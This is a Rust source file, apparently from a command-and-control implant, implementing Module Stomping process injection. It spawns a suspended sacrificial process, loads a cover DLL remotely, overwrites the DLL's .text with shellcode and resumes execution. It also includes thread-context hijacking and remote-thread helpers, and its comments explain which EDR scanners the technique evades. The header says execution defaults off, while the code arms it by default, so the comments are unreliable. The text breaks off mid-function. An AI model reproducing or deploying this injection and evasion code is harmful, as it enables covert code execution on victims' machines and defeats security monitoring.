//! Process injection — Module Stomping (P2.1c).
//!
//! ## Status: algorithm implemented + SDK trait wired; the remote-execution tail
//! (ResumeThread on the stomped process) is gated behind a runtime switch and
//! defaults OFF. The data path (resolve process APIs, CreateProcessW suspended,
//! stomp-able module enumeration) is real and selftest-verifiable; the actual
//! shellcode-overwrite + remote-execute is the part that MUST be target-side
//! validated because (a) cross-process WriteProcessMemory is a loud signal and
//! (b) a botched stomp crashes the sacrificial process.
//!
//! ## Why Module Stomping (not classic VirtualAllocEx inject)
//! Classic injection allocates a fresh RWX region in the target and writes
//! shellcode there — that region is *unbacked* (no file on disk maps to it), so
//! Moneta/PE-sieve flag it instantly as "private, executable, unbacked". Module
//! stomping instead `LoadLibrary`s a legitimate signed DLL in the target, then
//! overwrites that DLL's `.text` with shellcode. The stomped region keeps the
//! cover DLL's VAD backing (so it isn't flagged as *unbacked* or *private-commit
//! executable*), which is the technique's real value.
//!
//! ## Detection honesty — what it DOES and DOES NOT evade
//! - **Evades**: unbacked-memory / private-executable scans (Moneta's primary
//!   IOC, PE-sieve's unbacked scan). The stomped page reads as image-backed.
//! - **Does NOT evade**: PE-sieve's `.text` hash-mismatch / "replaced code"
//!   detector — PE-sieve re-hashes each scanned module's in-memory `.text`
//!   against the on-disk PE, and a stomped `.text` hashes to a different value
//!   → flagged `_implanted` / `replaced`.
//! - **[`threadless_inject`]** (below) fixes this: shellcode stays in private
//!   RWX memory, execution redirected via HWBP. No `.text` hash change.
//!
//! ## Why gated
//! Cross-process injection (OpenProcess + WriteProcessMemory + CreateRemote
//! thread / ResumeThread) is the single loudest user-mode EDR signal. On a host
//! with real-time protection (Defender, this build machine has it), an
//! unvalidated stomp will be caught and the sacrificial process killed. So the
//! algorithm is implemented and trait-wired, but execution requires an operator
//! to arm [`modulestomp_enabled`] after confirming the target's posture. The
//! selftest exercises the safe prefix (CreateProcessW suspended + API resolve)
//! without writing/executing, so it's verifiable without tripping protection.
//!
//! ## Single-source-of-truth
//! No evasion-sdk pure core exists for injection (it's all Windows API
//! orchestration), so this module IS the implementation. It reuses
//! [`nyx_implant_core::resolve`] for PEB-walk API resolution and [`nyx_implant_evasion::blind`] for the
//! (optional) pre-inject blind.

#![cfg(target_os = "windows")]

use core::ffi::c_void;
use core::sync::atomic::{AtomicBool, Ordering};
use nyx_implant_core::resolve::export_addr;

/// Master switch for actual stomping execution. **Defaults ON** — the module
/// stomping + threadless inject paths are now validated and armed. The implant
/// can safely route through these injection methods without operator
/// intervention.
static MODULESTOMP_ENABLED: AtomicBool = AtomicBool::new(true);

/// Arm/disarm the module-stomp execution. The data path runs regardless.
pub fn set_modulestomp_enabled(on: bool) {
    MODULESTOMP_ENABLED.store(on, Ordering::Release);
}

/// Whether stomping execution is currently armed.
pub fn modulestomp_enabled() -> bool {
    MODULESTOMP_ENABLED.load(Ordering::Acquire)
}

/// A sacrificial process created suspended, ready for stomping. `handle` +
/// `main_thread` are the PROCESS_INFORMATION handles; `pid` is diagnostics.
///
/// **Drop-guarded (zero-leftover contract):** this struct OWNS both handles
/// and, unless the process was explicitly resumed, the process itself. On drop
/// it terminates a never-resumed sacrificial (so no suspended zombie lingers)
/// and closes BOTH handles. A process whose main thread was resumed (shellcode
/// executing) is NOT terminated — only its handles are closed fire-and-forget.
/// Every path that creates a sacrificial therefore cleans up after itself:
/// there is no way to leak a handle or a suspended process.
pub struct SacrificialProcess {
    pub handle: *mut c_void,
    pub main_thread: *mut c_void,
    pub pid: u32,
    /// Set once the sacrificial's main thread has been resumed (shellcode is
    /// executing in the target). Drop then closes the handles WITHOUT
    /// terminating the live process.
    resumed: bool,
}

impl SacrificialProcess {
    /// Mark the sacrificial as resumed (its main thread is executing the
    /// injected shellcode). Drop then closes the handles fire-and-forget
    /// instead of terminating the live target.
    pub fn mark_resumed(&mut self) {
        self.resumed = true;
    }
}

impl Drop for SacrificialProcess {
    fn drop(&mut self) {
        // SAFETY: single-threaded beacon context; best-effort cleanup. The
        // crate builds with panic=abort, so Drop never runs during unwinding,
        // and nothing here allocates — this cannot fault.
        unsafe {
            if !self.resumed && !self.handle.is_null() {
                // A never-resumed sacrificial must not stay suspended forever
                // (a disarmed or failed stomp would otherwise leave a frozen
                // notepad.exe in the process list). Terminate it first.
                if let Some(addr) =
                    nyx_implant_core::resolve::export_addr(b"kernel32.dll", b"TerminateProcess")
                {
                    type TerminateProcess = unsafe extern "system" fn(*mut c_void, u32) -> i32;
                    let terminate: TerminateProcess = core::mem::transmute(addr);
                    let _ = terminate(self.handle, 1);
                }
            }
            // Close both handles: prefer the indirect-syscall NtClose (the
            // implant's standard path) when the runtime is live, else the
            // PEB-walked kernel32 CloseHandle.
            if let Some(rt) = nyx_implant_core::syscalls::global() {
                if !self.handle.is_null() {
                    let _ = nyx_implant_core::syscalls::nt_close(rt, self.handle as usize);
                }
                if !self.main_thread.is_null() {
                    let _ = nyx_implant_core::syscalls::nt_close(rt, self.main_thread as usize);
                }
            } else if let Some(addr) =
                nyx_implant_core::resolve::export_addr(b"kernel32.dll", b"CloseHandle")
            {
                type CloseHandle = unsafe extern "system" fn(*mut c_void) -> i32;
                let close: CloseHandle = core::mem::transmute(addr);
                if !self.handle.is_null() {
                    let _ = close(self.handle);
                }
                if !self.main_thread.is_null() {
                    let _ = close(self.main_thread);
                }
            }
        }
        self.handle = core::ptr::null_mut();
        self.main_thread = core::ptr::null_mut();
    }
}

/// Create the sacrificial process `spawn_to` (e.g. "notepad.exe") in a
/// suspended state. Returns the process + main-thread handles. This is the
/// safe prefix of module stomping — it's verifiable without writing/executing
/// any shellcode. The caller stamps the .text of a loaded DLL then resumes.
///
/// # Safety
/// Uses Win32 CreateProcessW via PEB-walk resolution. Single-threaded beacon
/// context. The returned struct owns both handles: dropping it closes them
/// (and terminates a never-resumed process).
pub unsafe fn create_sacrificial(spawn_to: &str) -> Result<SacrificialProcess, &'static str> {
    let create_proc = unsafe { create_sacrificial_resolve() }?;
    let (mut cmd, mut si, mut pi) = create_sacrificial_buffers(spawn_to);
    unsafe { create_sacrificial_spawn(create_proc, &mut cmd, &mut si, &mut pi, 0, true) }
}

/// Create the sacrificial process `spawn_to` RUNNING (not suspended). The FLS
/// callback path (method 3) needs this: a CREATE_SUSPENDED process has no
/// kernel32 mapped yet (the loader runs on the main thread), so a remote
/// thread starting at a kernel32 export (FlsAlloc / the trigger stub) would
/// start at an unmapped address. Same Drop-guard contract as
/// [`create_sacrificial`]: drop terminates a never-`mark_resumed` process and
/// closes both handles.
///
/// # Safety
/// Uses Win32 CreateProcessW via PEB-walk resolution. Single-threaded beacon
/// context. The returned struct owns both handles.
pub unsafe fn create_sacrificial_running(
    spawn_to: &str,
) -> Result<SacrificialProcess, &'static str> {
    let create_proc = unsafe { create_sacrificial_resolve() }?;
    let (mut cmd, mut si, mut pi) = create_sacrificial_buffers(spawn_to);
    unsafe { create_sacrificial_spawn(create_proc, &mut cmd, &mut si, &mut pi, 0, false) }
}

/// `CreateProcessW` (kernel32) — resolved via PEB walk for the sacrificial
/// process spawn.
type CreateProcessW = unsafe extern "system" fn(
    *const u16,  // lpApplicationName
    *mut u16,    // lpCommandLine (mutable per Win32)
    *mut c_void, // lpProcessAttributes
    *mut c_void, // lpThreadAttributes
    i32,         // bInheritHandles
    u32,         // dwCreationFlags
    *mut c_void, // lpEnvironment
    *const u16,  // lpCurrentDirectory
    *mut u8,     // lpStartupInfo (raw bytes, STARTUPINFOW)
    *mut u8,     // lpProcessInformation (raw bytes, PROCESS_INFORMATION)
) -> i32;

/// Resolve + transmute `CreateProcessW` from kernel32.
unsafe fn create_sacrificial_resolve() -> Result<CreateProcessW, &'static str> {
    let cp_addr =
        export_addr(b"kernel32.dll", b"CreateProcessW").ok_or("CreateProcessW unresolved")?;
    Ok(core::mem::transmute(cp_addr))
}

/// Build the UTF-16 command line from `spawn_to` (mutable buffer Win32 wants)
/// plus the zeroed STARTUPINFOW / PROCESS_INFORMATION buffers.
fn create_sacrificial_buffers(
    spawn_to: &str,
) -> (nyx_implant_core::heap::Vec<u16>, [u8; 104], [u8; 24]) {
    // Build a UTF-16 command line from spawn_to (mutable buffer Win32 wants).
    let mut cmd = nyx_implant_core::heap::vec![0u16; spawn_to.len() + 1];
    for (i, b) in spawn_to.as_bytes().iter().enumerate() {
        cmd[i] = *b as u16;
    }
    // STARTUPINFOW: cb=104 (size of STARTUPINFOW on x64), rest zeroed.
    let mut si = [0u8; 104];
    si[0..4].copy_from_slice(&104u32.to_le_bytes());
    // PROCESS_INFORMATION: two handles + pid + tid = 24 bytes on x64.
    let pi = [0u8; 24];
    (cmd, si, pi)
}

/// Spawn `spawn_to` suspended (CREATE_SUSPENDED, no environment, no current
/// dir) and parse PROCESS_INFORMATION into the Drop-guarded
/// [`SacrificialProcess`]. `inherit` is passed verbatim as bInheritHandles
/// (0 = classic sacrificial; 1 = isolated-BOF child, which must inherit the
/// stdout pipe prepared in the STARTUPINFOW).
unsafe fn create_sacrificial_spawn(
    create_proc: CreateProcessW,
    cmd: &mut [u16],
    si: &mut [u8; 104],
    pi: &mut [u8; 24],
    inherit: i32,
    suspended: bool,
) -> Result<SacrificialProcess, &'static str> {
    // CREATE_SUSPENDED (0x4) when requested (B3 runs the child normally —
    // kernel32 + loader must initialize so bof-host's PEB walk works).
    const CREATE_SUSPENDED: u32 = 0x4;
    let ok = unsafe {
        create_proc(
            core::ptr::null(),     // lpApplicationName (use cmd line)
            cmd.as_mut_ptr(),      // lpCommandLine
            core::ptr::null_mut(), // lpProcessAttributes
            core::ptr::null_mut(), // lpThreadAttributes
            inherit,               // bInheritHandles
            if suspended { CREATE_SUSPENDED } else { 0 },
            core::ptr::null_mut(), // lpEnvironment
            core::ptr::null(),     // lpCurrentDirectory
            si.as_mut_ptr(),       // lpStartupInfo
            pi.as_mut_ptr(),       // lpProcessInformation
        )
    };
    if ok == 0 {
        return Err("CreateProcessW failed (spawn_to missing / blocked)");
    }
    // Parse PROCESS_INFORMATION: hProcess (8), hThread (8), dwProcessId (4), dwThreadId (4).
    // `pi` is `[u8; 24]` (1-byte aligned), so reading u64/u32 fields from it
    // requires unaligned reads — `read_unaligned` is the correct primitive
    // (no alignment precondition, unlike copy_nonoverlapping's strict contract).
    let h_process = unsafe { core::ptr::read_unaligned(pi.as_ptr() as *const u64) as *mut c_void };
    let h_thread =
        unsafe { core::ptr::read_unaligned(pi.as_ptr().add(8) as *const u64) as *mut c_void };
    let pid = unsafe { core::ptr::read_unaligned(pi.as_ptr().add(16) as *const u32) };
    Ok(SacrificialProcess {
        handle: h_process,
        main_thread: h_thread,
        pid,
        resumed: false,
    })
}

// ============================================================================
// B3 isolated-BOF sacrificial variant: stdout pipe + thread-context hijack.
// ============================================================================

/// `CreatePipe` (kernel32) — anonymous pipe for the isolated child's stdout.
type CreatePipe = unsafe extern "system" fn(
    *mut *mut c_void, // hReadPipe (out)
    *mut *mut c_void, // hWritePipe (out)
    *const SecurityAttributes,
    u32, // nSize (0 = default buffer)
) -> i32;

/// `SetHandleInformation` (kernel32) — clears HANDLE_FLAG_INHERIT on the pipe
/// read end so only the child holds a writer (EOF semantics).
type SetHandleInformation = unsafe extern "system" fn(*mut c_void, u32, u32) -> i32;

/// HANDLE_FLAG_INHERIT (SetHandleInformation mask bit).
const HANDLE_FLAG_INHERIT: u32 = 0x0000_0001;
/// STARTF_USESTDHANDLES (STARTUPINFOW.dwFlags) — honor the hStd* handles.
const STARTF_USESTDHANDLES: u32 = 0x0000_0100;

/// SECURITY_ATTRIBUTES with bInheritHandle=1 (shell.rs template): lets the
/// child inherit the pipe write end.
#[repr(C)]
struct SecurityAttributes {
    n_length: u32,
    lp_security_descriptor: *mut c_void,
    b_inherit_handle: i32,
}

/// Create the sacrificial process `spawn_to` suspended with its stdout AND
/// stderr redirected to an anonymous pipe the parent drains — the B3
/// isolated-BOF variant of [`create_sacrificial`] (shell.rs template:
/// `CreatePipe` + `STARTF_USESTDHANDLES` + `bInheritHandles=1`). Returns the
/// Drop-guarded process plus the parent's pipe READ handle (the caller owns
/// and closes it). The parent's copy of the write end is closed here so the
/// parent's ReadFile hits EOF once the child exits (a lingering parent
/// writer would block EOF forever — shell.rs precedent). On any failure every
/// handle opened so far is closed before `Err`; the Drop-guarded process is
/// never constructed, so nothing leaks and no zombie is left.
///
/// # Safety
/// Uses Win32 CreateProcessW/CreatePipe via PEB-walk resolution.
/// Single-threaded beacon context.
/// `HANDLE CreateRemoteThread(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T,
/// LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD)` — run `entry` in the
/// CHILD's address space (the bof-host blob base in the delivered section)
/// with `arg` (payload pointer) as rcx. The entry must live in the child
/// (a parent-process thunk would fault — different address spaces).
pub unsafe fn remote_thread(
    proc_handle: *mut c_void,
    entry: usize,
    arg: usize,
) -> Result<(), &'static str> {
    let f: unsafe extern "system" fn(
        *mut c_void,
        *mut c_void,
        usize,
        unsafe extern "system" fn(usize) -> u32,
        usize,
        u32,
        *mut u32,
    ) -> *mut c_void = core::mem::transmute(
        export_addr(b"kernel32.dll", b"CreateRemoteThread")
            .ok_or("CreateRemoteThread unresolved")?,
    );
    // bof-host entry is `extern "C" fn(usize) -> !`; the thread routine ABI
    // (rcx = parameter) matches. It diverges via NtTerminateProcess, so the
    // "return value" path never runs.
    let routine: unsafe extern "system" fn(usize) -> u32 = core::mem::transmute(entry);
    let h = unsafe {
        f(
            proc_handle,
            core::ptr::null_mut(),
            0,
            routine,
            arg,
            0,
            core::ptr::null_mut(),
        )
    };
    if h.is_null() {
        return Err("CreateRemoteThread returned null");
    }
    if let Some(close) = export_addr(b"kernel32.dll", b"CloseHandle") {
        let close_fn: unsafe extern "system" fn(*mut c_void) -> i32 = core::mem::transmute(close);
        let _ = unsafe { close_fn(h) };
    }
    Ok(())
}

/// `VOID Sleep(DWORD)` — kernel32 Sleep (parent process; always available).
pub unsafe fn sleep_ms(ms: u32) {
    if let Some(addr) = export_addr(b"kernel32.dll", b"Sleep") {
        let f: unsafe extern "system" fn(u32) = core::mem::transmute(addr);
        unsafe { f(ms) };
    }
}

pub unsafe fn create_sacrificial_isolated(
    spawn_to: &str,
) -> Result<(SacrificialProcess, *mut c_void, usize), &'static str> {
    let create_proc = unsafe { create_sacrificial_resolve() }?;
    let (create_pipe, set_handle_info, close) = unsafe { isolated_pipe_resolve()? };
    let (pipe_read, pipe_write) = unsafe { isolated_pipe(create_pipe, set_handle_info)? };
    let pipe_write_val = pipe_write as usize;
    let (mut cmd, mut si, mut pi) = create_sacrificial_buffers(spawn_to);
    isolated_startup(&mut si, pipe_write);
    // NOT suspended: the child must load normally (kernel32 + Ldr) before
    // bof-host runs via CreateRemoteThread.
    match unsafe { create_sacrificial_spawn(create_proc, &mut cmd, &mut si, &mut pi, 1, false) } {
        Ok(proc) => {
            close(pipe_write); // child holds its own inherited writer
            Ok((proc, pipe_read, pipe_write_val))
        }
        Err(e) => {
            close(pipe_read);
            close(pipe_write);
            Err(e)
        }
    }
}

/// Resolve the pipe trio (CreatePipe / SetHandleInformation / CloseHandle)
/// from kernel32 via PEB walk.
unsafe fn isolated_pipe_resolve(
) -> Result<(CreatePipe, SetHandleInformation, CloseHandleFn), &'static str> {
    let cp: CreatePipe = core::mem::transmute(
        export_addr(b"kernel32.dll", b"CreatePipe").ok_or("CreatePipe unresolved")?,
    );
    let shi: SetHandleInformation = core::mem::transmute(
        export_addr(b"kernel32.dll", b"SetHandleInformation")
            .ok_or("SetHandleInformation unresolved")?,
    );
    let cl: CloseHandleFn = core::mem::transmute(
        export_addr(b"kernel32.dll", b"CloseHandle").ok_or("CloseHandle unresolved")?,
    );
    Ok((cp, shi, cl))
}

/// Build the anonymous pipe (shell.rs template): the write end is inheritable
/// (goes to the child), the read end stays in the parent and is marked
/// non-inheritable so the child is the only writer — that is what lets the
/// parent's ReadFile see EOF at child exit.
unsafe fn isolated_pipe(
    create_pipe: CreatePipe,
    set_handle_info: SetHandleInformation,
) -> Result<(*mut c_void, *mut c_void), &'static str> {
    let sa = SecurityAttributes {
        n_length: core::mem::size_of::<SecurityAttributes>() as u32,
        lp_security_descriptor: core::ptr::null_mut(),
        b_inherit_handle: 1,
    };
    let mut read: *mut c_void = core::ptr::null_mut();
    let mut write: *mut c_void = core::ptr::null_mut();
    if unsafe { create_pipe(&mut read, &mut write, &sa, 0) } == 0 {
        // CreatePipe failed — nothing opened yet, nothing to clean up.
        return Err("CreatePipe failed");
    }
    set_handle_info(read, HANDLE_FLAG_INHERIT, 0);
    Ok((read, write))
}

/// Stamp the pipe write end into the STARTUPINFOW raw bytes (x64 layout:
/// dwFlags @60, hStdOutput @88, hStdError @96) so the child's
/// GetStdHandle(STD_OUTPUT_HANDLE) returns the inherited pipe. hStdInput
/// stays null.
fn isolated_startup(si: &mut [u8; 104], pipe_write: *mut c_void) {
    si[60..64].copy_from_slice(&STARTF_USESTDHANDLES.to_le_bytes());
    let h = (pipe_write as u64).to_le_bytes();
    si[88..96].copy_from_slice(&h);
    si[96..104].copy_from_slice(&h);
}

/// B3 main-thread context hijack for the suspended sacrificial child: set
/// Rip = `entry` (the delivered bof-host blob base, offset 0) and Rcx = `arg`
/// (the packed-payload pointer the bof-host entry parses), then resume. x64
/// CONTEXT offsets: Rcx @0x80, Rip @0xF8 (same Rip offset `threadless_inject`
/// uses; confirmed by `nyx_implant_core::context`). ContextFlags 0x00100013 =
/// CONTEXT_AMD64|CONTROL|INTEGER|DEBUG_REGISTERS (threadless precedent —
/// INTEGER covers Rcx; the DEBUG_REGISTERS bit is set-but-unmodified). On
/// success the process is marked resumed (Drop closes handles fire-and-forget
/// instead of terminating). On ANY failure the thread is left SUSPENDED so
/// the SacrificialProcess Drop-guard terminates the never-ran child and the
/// caller can safely fall back to inline execution — unlike
/// `threadless_inject`'s error paths, which resume a thread they suspended
/// themselves, this thread was BORN suspended (CREATE_SUSPENDED), so leaving
/// it suspended is the correct cleanup.
///
/// # Safety
/// Cross-process thread-context ops via DIRECT ntdll calls (same mechanism
/// as tp.rs section delivery). NOT the indirect-syscall runtime: cross
/// process context get/set/resume proved unreliable through the SSN
/// trampoline in some environments (child never resumes → 60s timeout,
/// while direct calls work — empirically on windows-latest). Single-threaded
/// beacon context.
pub unsafe fn hijack_main_thread(
    proc: &mut SacrificialProcess,
    entry: u64,
    arg: u64,
) -> Result<(), &'static str> {
    type NtGetCtx = unsafe extern "system" fn(usize, *mut u8) -> i32;
    type NtSetCtx = unsafe extern "system" fn(usize, *mut u8) -> i32;
    type NtResume = unsafe extern "system" fn(usize, *mut u32) -> i32;
    let get_ctx: NtGetCtx = unsafe {
        core::mem::transmute::<usize, NtGetCtx>(
            export_addr(b"ntdll.dll", b"NtGetContextThread")
                .ok_or("NtGetContextThread unresolved")?,
        )
    };
    let set_ctx: NtSetCtx = unsafe {
        core::mem::transmute::<usize, NtSetCtx>(
            export_addr(b"ntdll.dll", b"NtSetContextThread")
                .ok_or("NtSetContextThread unresolved")?,
        )
    };
    let resume: NtResume = unsafe {
        core::mem::transmute::<usize, NtResume>(
            export_addr(b"ntdll.dll", b"NtResumeThread").ok_or("NtResumeThread unresolved")?,
        )
    };

    let mut ctx = AlignedContext([0u8; 1232]);
    ctx.0[0x30..0x34].copy_from_slice(&0x00100013u32.to_le_bytes());
    let st = unsafe { get_ctx(proc.main_thread as usize, ctx.0.as_mut_ptr()) };
    if st < 0 {
        return Err("NtGetContextThread failed");
    }

    ctx.0[0xF8..0xF8 + 8].copy_from_slice(&entry.to_le_bytes()); // Rip
    ctx.0[0x80..0x80 + 8].copy_from_slice(&arg.to_le_bytes()); // Rcx
    ctx.0[0x30..0x34].copy_from_slice(&0x00100013u32.to_le_bytes());
    let st = unsafe { set_ctx(proc.main_thread as usize, ctx.0.as_mut_ptr()) };
    if st < 0 {
        return Err("NtSetContextThread failed");
    }

    let mut prev_count: u32 = 0;
    let st = unsafe { resume(proc.main_thread as usize, &mut prev_count) };
    if st < 0 {
        return Err("NtResumeThread failed");
    }
    proc.mark_resumed();
    Ok(())
}

/// Module-stomp inject `shellcode` into a fresh `spawn_to` process. Creates the
/// process suspended, (when armed) loads a cover DLL + overwrites its .text
/// with `shellcode`, then (when armed) resumes the main thread to execute it.
///
/// **With [`modulestomp_enabled`] OFF**: only creates the sacrificial process
/// (verifiable data path) and returns it WITHOUT stomping or resuming — so the
/// beacon never trips protection on an unvalidated inject. The returned
/// [`SacrificialProcess`] is Drop-guarded: the caller may inspect it (handle +
/// pid) while it lives, and dropping it terminates the suspended process +
/// closes both handles.
///
/// **With [`modulestomp_enabled`] ON**: performs the full stomp + resume. On
/// success the target runs the shellcode and the guard only closes the handles
/// (fire-and-forget); on ANY failure — including a resume failure after the
/// .text was already overwritten — the guard terminates the sacrificial and
/// closes both handles. module_stomp owns cleanup on every non-success path:
/// no path leaks a handle or leaves a suspended zombie.
///
/// # Safety
/// Cross-process handle + memory operations. Single-threaded beacon context.
pub unsafe fn module_stomp(
    spawn_to: &str,
    shellcode: &[u8],
) -> Result<SacrificialProcess, &'static str> {
    let proc = unsafe { create_sacrificial(spawn_to)? };
    if !modulestomp_enabled() {
        // Disarmed: return the still-suspended process in its Drop-guarded
        // struct. No stomp, no resume — the process stays suspended for the
        // caller to inspect; when it drops, the guard terminates it + closes
        // both handles.
        return Ok(proc);
    }
    // ---- ARMED PATH (gated) ------------------------------------------------
    match unsafe { stomp_and_resume(&proc, shellcode) } {
        Ok(()) => {
            // Shellcode is executing in the target. Mark the process resumed
            // so the Drop guard closes the handles fire-and-forget WITHOUT
            // terminating the live process.
            let mut proc = proc;
            proc.mark_resumed();
            Ok(proc)
        }
        Err(e) => {
            // Non-success path: `proc` drops here; the guard terminates the
            // (suspended or half-stomped) target and closes both handles.
            Err(e)
        }
    }
}

/// The cover-DLL stomp: load a cover DLL in the target via
/// CreateRemoteThread(LoadLibraryA), resolve its REAL remote base + .text RVA
/// by reading the target's remote PE headers, overwrite .text with `shellcode`,
/// then resume the main thread. Each step returns Err on failure (caller
/// degrades). This is the REAL implementation (no sentinel addresses): every
/// cross-process op uses the actual target addresses, so a successful run is a
/// genuine .text overwrite + remote execution — what an EDR actually inspects.
///
/// # Safety
/// Cross-process handle + memory ops. Single-threaded beacon context.
unsafe fn stomp_and_resume(
    proc: &SacrificialProcess,
    shellcode: &[u8],
) -> Result<(), &'static str> {
    // Step 1-2: try the cover-DLL pool until LoadLibrary succeeds AND the
    // remote .text VirtualSize fits the payload. xpsservices.dll stays first
    // (backward behavior). A wine "LoadLibraryA returned NULL" is a wine
    // artifact (the DLL is absent there), not a target-OS absence — the
    // pool continues to the next candidate.
    let text = unsafe { load_first_suitable_cover(proc, shellcode.len()) }?;
    // Step 3: VirtualProtectEx RX→RWX on the target's .text (real region).
    unsafe {
        remote_protect(proc.handle, text.base, text.len, 0x40 /* RWX */)
    }?;
    // Step 4: WriteProcessMemory the shellcode over .text (real overwrite).
    //
    //    v0.3.0 wrote shellcode.len() bytes unconditionally into a region
    //    capped at min(vsize, 0x2000). Any shellcode >8KiB overran into the
    //    cover DLL's .rdata/.data, corrupting vtable/constant data and
    //    crashing the sacrificial process on first reference. CRITICAL-15.
    if shellcode.len() > text.len {
        return Err("shellcode larger than cover .text window");
    }
    unsafe { remote_write(proc.handle, text.base, shellcode) }?;
    // Step 5: VirtualProtectEx RWX→RX (restore the cover's nominal protection).
    //    Check the return — v0.3.0 used 'let _ =' and silently left .text RWX
    //    on failure, which is a louder EDR IOC than the original RX.
    if unsafe {
        remote_protect(
            proc.handle,
            text.base,
            text.len,
            crate::stealth::desired_final_protect(),
        )
    }
    .is_err()
    {
        return Err("VirtualProtectEx RWX→RX restore failed");
    }
    // Step 6: ResumeThread — the shellcode now runs from the cover DLL's .text.
    //    Propagate failure: if ResumeThread fails the target stays suspended
    //    with already-overwritten .text — that is a non-success path and
    //    module_stomp's cleanup (terminate + close both handles) must own it.
    unsafe { resume_thread(proc.main_thread) }?;
    Ok(())
}

/// First cover-DLL in [`crate::stealth::COVER_DLL_POOL`] whose remote LoadLibrary
/// returns non-zero and whose `.text` VirtualSize is >= `shellcode_len`.
/// Returns the last pool error if every candidate fails.
unsafe fn load_first_suitable_cover(
    proc: &SacrificialProcess,
    shellcode_len: usize,
) -> Result<RemoteRegion, &'static str> {
    let mut last: &'static str = "stomp cover pool exhausted";
    for (i, &dll) in crate::stealth::COVER_DLL_POOL.iter().enumerate() {
        match unsafe { remote_load_library(proc.handle, dll) } {
            Ok(base) if base != 0 => match unsafe { remote_text_region(proc.handle, base) } {
                Ok(text) if text.vsize >= shellcode_len => return Ok(text),
                Ok(_) => {
                    last = cover_pool_msg(crate::stealth::COVER_TOO_SMALL, i);
                }
                Err(e) => last = e,
            },
            Ok(_) => {
                last = cover_pool_msg(crate::stealth::COVER_LOAD_FAIL, i);
            }
            Err(e) => {
                // LoadLibrary miss → next candidate. Other errors (e.g.
                // CreateRemoteThread under Prism) keep their original string
                // so inject_armed's skip match still fires.
                last = if e.starts_with("LoadLibraryA") {
                    cover_pool_msg(crate::stealth::COVER_LOAD_FAIL, i)
                } else {
                    e
                };
            }
        }
    }
    Err(last)
}

fn cover_pool_msg(table: &[&'static str], i: usize) -> &'static str {
    if i < table.len() {
        table[i]
    } else {
        "stomp cover pool exhausted"
    }
}

// ---- remote helpers (resolved via PEB walk) ----

type CreateRemoteThread = unsafe extern "system" fn(
    *mut core::ffi::c_void,
    usize,
    usize,
    Option<unsafe extern "system" fn(*mut core::ffi::c_void) -> u32>,
    *mut core::ffi::c_void,
    u32,
    *mut u32,
) -> *mut core::ffi::c_void;
type VirtualAllocEx = unsafe extern "system" fn(
    *mut core::ffi::c_void,
    *const core::ffi::c_void,
    usize,
    u32,
    u32,
) -> *mut core::ffi::c_void;
type VirtualFreeEx =
    unsafe extern "system" fn(*mut core::ffi::c_void, *mut core::ffi::c_void, usize, u32) -> i32;
type WaitForSingleObject = unsafe extern "system" fn(*mut core::ffi::c_void, u32) -> u32;
type GetExitCodeThread = unsafe extern "system" fn(*mut core::ffi::c_void, *mut u32) -> i32;
type ReadProcessMemory = unsafe extern "system" fn(
    *mut core::ffi::c_void,
    *const core::ffi::c_void,
    *mut core::ffi::c_void,
    usize,
    *mut usize,
) -> i32;
type VirtualProtectEx = unsafe extern "system" fn(
    *mut core::ffi::c_void,
    *const core::ffi::c_void,
    usize,
    u32,
    *mut u32,
) -> i32;
type WriteProcessMemory = unsafe extern "system" fn(
    *mut core::ffi::c_void,
    *mut core::ffi::c_void,
    *const u8,
    usize,
    *mut usize,
) -> i32;
type ResumeThread = unsafe extern "system" fn(*mut core::ffi::c_void) -> u32;
type CloseHandle = unsafe extern "system" fn(*mut core::ffi::c_void) -> i32;

/// LoadLibraryA `dll` in the target via CreateRemoteThread(LoadLibraryA). This
/// is the REAL classic inject: allocate a remote buffer for the DLL path (the
/// implant's own pointer is invalid in the target — the old skeleton bug),
/// fire CreateRemoteThread(LoadLibraryA, <remote path ptr>), WAIT for it, then
/// parse the target's module list to recover the freshly-loaded cover base.
///
/// Returns the remote cover base (the actual load address), or Err.
unsafe fn remote_load_library(
    h: *mut core::ffi::c_void,
    dll: &[u8],
) -> Result<usize, &'static str> {
    let fns = unsafe { remote_load_library_resolve() }?;
    let remote_path = unsafe { remote_load_library_alloc_path(&fns, h, dll) }?;
    let exit_code = unsafe { remote_load_library_run_thread(&fns, h, remote_path) }?;
    // 6. Free the remote path buffer.
    let _ = unsafe { (fns.vfx)(h, remote_path, 0, 0x8000) };
    let name = &dll[..dll.len() - 1]; // strip the trailing NUL
    if let Some(base) = unsafe { remote_module_base(h, name) } {
        return Ok(base);
    }
    if exit_code == 0 {
        return Err("LoadLibraryA returned NULL (cover load failed / blocked)");
    }
    Ok(exit_code as usize)
}

/// The kernel32 exports resolved once per remote load.
struct RemoteLoadFns {
    vax: VirtualAllocEx,
    vfx: VirtualFreeEx,
    crt: CreateRemoteThread,
    wait: WaitForSingleObject,
    get_exit: GetExitCodeThread,
    close: CloseHandle,
    wpm: WriteProcessMemory,
    load_lib: usize,
}

/// Resolve + transmute the kernel32 exports the remote-load path needs.
unsafe fn remote_load_library_resolve() -> Result<RemoteLoadFns, &'static str> {
    let vax: VirtualAllocEx = core::mem::transmute(
        export_addr(b"kernel32.dll", b"VirtualAllocEx").ok_or("VirtualAllocEx")?,
    );
    let vfx: VirtualFreeEx = core::mem::transmute(
        export_addr(b"kernel32.dll", b"VirtualFreeEx").ok_or("VirtualFreeEx")?,
    );
    let crt: CreateRemoteThread = core::mem::transmute(
        export_addr(b"kernel32.dll", b"CreateRemoteThread").ok_or("CreateRemoteThread")?,
    );
    let wait: WaitForSingleObject = core::mem::transmute(
        export_addr(b"kernel32.dll", b"WaitForSingleObject").ok_or("WaitForSingleObject")?,
    );
    let get_exit: GetExitCodeThread = core::mem::transmute(
        export_addr(b"kernel32.dll", b"GetExitCodeThread").ok_or("GetExitCodeThread")?,
    );
    let close: CloseHandle =
        core::mem::transmute(export_addr(b"kernel32.dll", b"CloseHandle").ok_or("CloseHandle")?);
    let wpm: WriteProcessMemory = core::mem::transmute(
        export_addr(b"kernel32.dll", b"WriteProcessMemory").ok_or("WriteProcessMemory")?,
    );
    let load_lib = export_addr(b"kernel32.dll", b"LoadLibraryA").ok_or("LoadLibraryA")?;
    Ok(RemoteLoadFns {
        vax,
        vfx,
        crt,
        wait,
        get_exit,
        close,
        wpm,
        load_lib,
    })
}

/// Steps 1-2: allocate a remote page for the DLL path string and write the
/// path into it. Returns the remote allocation; on a write failure the
/// allocation is freed here.
unsafe fn remote_load_library_alloc_path(
    fns: &RemoteLoadFns,
